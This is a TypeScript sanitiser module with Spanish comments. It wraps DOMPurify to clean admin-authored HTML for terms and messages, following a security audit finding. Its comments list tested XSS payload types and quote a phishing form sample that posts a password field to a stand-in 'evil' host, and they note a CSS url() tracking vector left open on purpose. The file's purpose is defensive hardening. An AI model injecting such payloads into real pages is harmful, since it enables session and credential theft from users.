import DOMPurify from 'dompurify';

/**
 * Sanitiza HTML antes de inyectarlo con `dangerouslySetInnerHTML`.
 *
 * POR QUE EXISTE
 *
 * F-6 de la auditoria del 05-sep-2026: habia 9 usos de
 * `dangerouslySetInnerHTML` en 6 archivos, todos con HTML que sale de la base
 * (`terms.content`, `message_body`) y ninguno sanitizado.
 *
 * Ese contenido lo escriben admins, asi que NO era un XSS que pudiera explotar
 * un usuario cualquiera. El problema es de amplificacion: una sola cuenta de
 * admin comprometida dejaba de ser "un admin malicioso" y pasaba a ser
 * ejecucion de JavaScript en el navegador de TODOS los viajeros y agencias que
 * abrieran los terminos —con robo de sesion incluido—, porque tres de esos
 * nueve sitios son de cara al usuario final:
 *
 *   TermsOfServicePage        cualquier visitante
 *   TermsAcceptanceGate       todo usuario que acepta terminos
 *   OnboardingTermsStep       toda agencia que se da de alta
 *
 * Sanitizar en el render corta esa amplificacion sin quitarle nada al editor de
 * contenido, y es una defensa que no depende de que ninguna cuenta se mantenga
 * integra.
 *
 * POR QUE DOMPURIFY Y NO UN SANEADOR PROPIO
 *
 * Escribir un sanitizador de HTML a mano es un antipatron clasico de seguridad:
 * el espacio de evasiones (entidades, namespaces, mutation XSS) es enorme y se
 * descubren tecnicas nuevas cada ano. DOMPurify es la implementacion de
 * referencia, no tiene dependencias, trae sus propios tipos, y se comprobo
 * contra la base de avisos de npm que la version fijada (3.4.15) no tiene
 * ninguno.
 *
 * NOTA SOBRE EL PERFIL
 *
 * Se usa `USE_PROFILES: { html: true }`, que permite HTML pero NO SVG ni
 * MathML. El contenido real son terminos y boletines —texto con formato,
 * enlaces y tablas—, asi que no se pierde nada, y SVG es un vector de XSS
 * habitual que no hace falta tener abierto.
 *
 * Encima del perfil van dos ajustes, y los dos salieron de PROBAR la
 * configuracion contra payloads reales en Chromium, no de leer la
 * documentacion:
 *
 *   FORBID_TAGS con form/input/button/...
 *     El perfil html de DOMPurify PERMITE formularios. Se comprobo: un
 *     `<form action="//evil"><input type="password">` pasaba entero. No es
 *     ejecucion de JavaScript, pero es exactamente el escenario de
 *     amplificacion de F-6 con otro disfraz: un admin comprometido inyecta un
 *     "inicia sesion para aceptar los terminos" que postea a su servidor, y lo
 *     ve todo el que abra la pagina. Ni los terminos ni los boletines tienen
 *     por que llevar formularios.
 *
 *   ADD_ATTR: ['target'] + hook que fuerza rel="noopener noreferrer"
 *     El perfil quitaba `target="_blank"` de los enlaces, lo que cambiaba el
 *     comportamiento de contenido legitimo. Se vuelve a permitir, pero
 *     anadiendo `rel` para cerrar el reverse tabnabbing que trae de la mano.
 *
 * LO QUE SE COMPROBO EJECUTANDO, Y LO QUE QUEDA ABIERTO A PROPOSITO
 *
 * Se probaron 12 payloads renderizandolos de verdad en Chromium con esta misma
 * configuracion. Quedan neutralizados: `<script>`, `onerror`, `onload`,
 * `onmouseover`, `onclick`, `javascript:` en href, `<svg>`, `<iframe>`,
 * `<object>`, `<embed>`, `<meta http-equiv=refresh>` y los formularios. El
 * contenido legitimo (titulos, negritas, listas, tablas, enlaces) pasa intacto.
 *
 * Dos resultados que merecen quedar escritos:
 *
 *   `style="background:url(javascript:...)"` NO ejecuta. Se renderizo de verdad
 *   y no corrio nada: los navegadores modernos bloquean `javascript:` en CSS.
 *   Aparecia como sospechoso en el barrido y resulto falso positivo.
 *
 *   `style="background-image:url(//servidor-ajeno/x.png)"` SI sobrevive, y al
 *   renderizarse pide ese recurso. Es un vector de rastreo: revela IP y
 *   User-Agent de quien lee, y la URL puede llevar datos. Se deja pasar A
 *   PROPOSITO. Quitar `url()` de los estilos en linea romperia el contenido
 *   legitimo de boletines y mensajes masivos, que suelen usar imagenes de
 *   fondo. No es ejecucion de codigo ni robo de credenciales, y exige una
 *   cuenta de admin ya comprometida. Si algun dia se decide cerrarlo, el sitio
 *   es un hook `afterSanitizeAttributes` que limpie `url(...)` del atributo
 *   `style`.
 *
 * NOTA SOBRE EL ENTORNO
 *
 * DOMPurify necesita un DOM. Aqui corre siempre en el navegador: el build es un
 * `vite build` plano, sin SSR ni prerender. Si algun dia se agrega renderizado
 * en servidor, esta funcion necesitara un DOM (jsdom) o habra que saltarla en
 * ese camino.
 */

/** Etiquetas de formulario: ver la nota del perfil, arriba. */
const ETIQUETAS_PROHIBIDAS = [
  'form',
  'input',
  'button',
  'textarea',
  'select',
  'option',
  'label',
  'fieldset',
];

let hookRegistrado = false;

/**
 * Un enlace con `target="_blank"` da al sitio destino acceso a `window.opener`
 * y con el a `location` de esta pestana (reverse tabnabbing). `rel` lo corta.
 * El hook se registra una sola vez, en el modulo, no en cada llamada.
 */
const registrarHookDeEnlaces = (): void => {
  if (hookRegistrado) return;
  DOMPurify.addHook('afterSanitizeAttributes', (nodo) => {
    if (nodo instanceof Element && nodo.hasAttribute('target')) {
      nodo.setAttribute('rel', 'noopener noreferrer');
    }
  });
  hookRegistrado = true;
};

/**
 * Devuelve el HTML sin nada ejecutable. Cadena vacia si la entrada es vacia,
 * null o undefined, para que el llamador no tenga que comprobarlo.
 */
export const sanitizeHtml = (html: string | null | undefined): string => {
  if (!html) return '';
  registrarHookDeEnlaces();
  return DOMPurify.sanitize(html, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ETIQUETAS_PROHIBIDAS,
    ADD_ATTR: ['target'],
  });
};
